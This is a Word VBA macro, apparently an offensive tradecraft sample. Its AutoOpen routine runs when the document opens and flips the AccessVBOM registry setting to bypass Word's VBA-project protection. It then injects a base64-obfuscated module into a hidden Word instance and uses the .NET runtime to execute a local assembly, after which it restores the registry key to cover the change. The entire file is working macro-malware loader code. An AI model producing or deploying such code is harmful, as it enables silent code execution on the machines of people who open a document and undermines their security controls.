Option Explicit

Function DecodeBase64(b64$)
    Dim b
    With CreateObject("Microsoft.XMLDOM").createElement("b64")
        .DataType = "bin.base64": .Text = b64
        b = .nodeTypedValue
        With CreateObject("ADODB.Stream")
            .Open: .Type = 1: .Write b: .Position = 0: .Type = 2: .Charset = "utf-8"
            DecodeBase64 = .ReadText
            .Close
        End With
    End With
End Function

Private Sub SetRegKey(val As Integer)
 Dim wsh As Object
 Dim registryKey As String
 Set wsh = CreateObject("WScript.Shell")
 registryKey = "HKEY_CURRENT_USER\Software\Microsoft\Office\" & Application.Version & "\Word\Security\AccessVBOM"
 wsh.RegWrite registryKey, val, "REG_DWORD"
End Sub  

Sub AutoOpen()
    
    SetRegKey (1)
    
    Dim wordObj As Word.Application
    Set wordObj = CreateObject("Word.Application")
    
    Dim ModuleObj As Object
    Set ModuleObj = wordObj.Documents.Add().VBProject.VBComponents.Add(1)
    ModuleObj.Name = "TestModule"

    'ExecuteAssembly.vba base64 encoded
    Dim stg1 As String
    stg1 = "T3B0aW9uIEV4cGxpY2l0DQoNClByaXZhdGUgRGVjbGFyZSBQdHJTYWZlIEZ1bmN0aW9uIERpc3BDYWxs"
    stg1 = stg1 & "RnVuYyBMaWIgIm9sZWF1dDMyLmRsbCIgKEJ5VmFsIHB2IEFzIExvbmdQdHIsIEJ5VmFsIG92IEFzIExv"
    stg1 = stg1 & "bmdQdHIsIEJ5VmFsIGNjIEFzIEludGVnZXIsIEJ5VmFsIHZyIEFzIEludGVnZXIsIEJ5VmFsIGNhIEFz"
    stg1 = stg1 & "IExvbmcsIEJ5UmVmIHByIEFzIEludGVnZXIsIEJ5UmVmIHBnIEFzIExvbmdQdHIsIEJ5UmVmIHBhciBB"
    stg1 = stg1 & "cyBWYXJpYW50KSBBcyBMb25nDQoNClN1YiBTdGcxKCkNCg0KICAgIFRoaXNEb2N1bWVudC5WQlByb2pl"
    stg1 = stg1 & "Y3QuUmVmZXJlbmNlcy5BZGRGcm9tRmlsZSAiQzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29y"
    stg1 = stg1 & "a1x2Mi4wLjUwNzI3XG1zY29yZWUudGxiIg0KICAgIFRoaXNEb2N1bWVudC5WQlByb2plY3QuUmVmZXJl"
    stg1 = stg1 & "bmNlcy5BZGRGcm9tRmlsZSAiQzpcV2luZG93c1xNaWNyb3NvZnQuTkVUXEZyYW1ld29ya1x2Mi4wLjUw"
    stg1 = stg1 & "NzI3XG1zY29ybGliLnRsYiINCiAgICANCiAgICBDYWxsIFN0ZzINCg0KRW5kIFN1Yg0KDQpTdWIgU3Rn"
    stg1 = stg1 & "MigpDQoNCiAgICBEaW0gdXJsDQoJdXJsID0gIkM6XEhlbGxvV29ybGQuZXhlIg0KICAgIA0KDQogICAg"
    stg1 = stg1 & "RGltIElDUkhvc3QgQXMgTmV3IG1zY29yZWUuQ29yUnVudGltZUhvc3QNCiAgICBEaW0gSURvbWFpbiBB"
    stg1 = stg1 & "cyBBcHBEb21haW4NCiAgICBJQ1JIb3N0LlN0YXJ0DQogICAgSUNSSG9zdC5HZXREZWZhdWx0RG9tYWlu"
    stg1 = stg1 & "IElEb21haW4NCiANCiAgICBEaW0gcHJndnQoMCBUbyAxKSBBcyBJbnRlZ2VyDQogICAgRGltIHByZ3B2"
    stg1 = stg1 & "YXJnKDAgVG8gMSkgQXMgTG9uZ1B0cg0KICAgIA0KICAgIHByZ3Z0KDApID0gVmFyVHlwZShDVmFyKHVy"
    stg1 = stg1 & "bCkpDQogICAgcHJncHZhcmcoMCkgPSBWYXJQdHIodXJsKQ0KDQogICAgRGltIG91dDogb3V0ID0gMA0K"
    stg1 = stg1 & "ICAgIERpbSByZXQgQXMgVmFyaWFudA0KICAgIA0KICAgIHByZ3Z0KDEpID0gVmFyVHlwZShDVmFyKG91"
    stg1 = stg1 & "dCkpDQogICAgcHJncHZhcmcoMSkgPSBWYXJQdHIob3V0KQ0KICAgIA0KICAgIA0KICAgICdDYWxscyBB"
    stg1 = stg1 & "cHBEb21haW4uRXhlY3V0ZUFzc2VtYmx5KEFTU0VNQkxZX1VSTCwgRXZpZGVuY2UgT0JKRUNUKQ0KICAg"
    stg1 = stg1 & "IERpbSBociBBcyBMb25nDQogICAgaHIgPSBEaXNwQ2FsbEZ1bmMoT2JqUHRyKElEb21haW4pLCA1MSAq"
    stg1 = stg1 & "IExlbihwcmdwdmFyZygwKSksIDQsIHZiTG9uZywgMiwgcHJndnQoMCksIHByZ3B2YXJnKDApLCByZXQp"
    stg1 = stg1 & "DQogICAgDQpFbmQgU3ViDQoNCg0K"
    
    Dim stg1dec As String
    stg1dec = DecodeBase64(stg1)
    
    wordObj.Visible = False
    wordObj.DisplayAlerts = False
    ModuleObj.codeModule.AddFromString (stg1dec)
    wordObj.Application.Run ("TestModule.Stg1")
    wordObj.ActiveDocument.Close (False)
    'wordObj.Documents(1).Close (False)
    
    SetRegKey (0)
        
    
End Sub
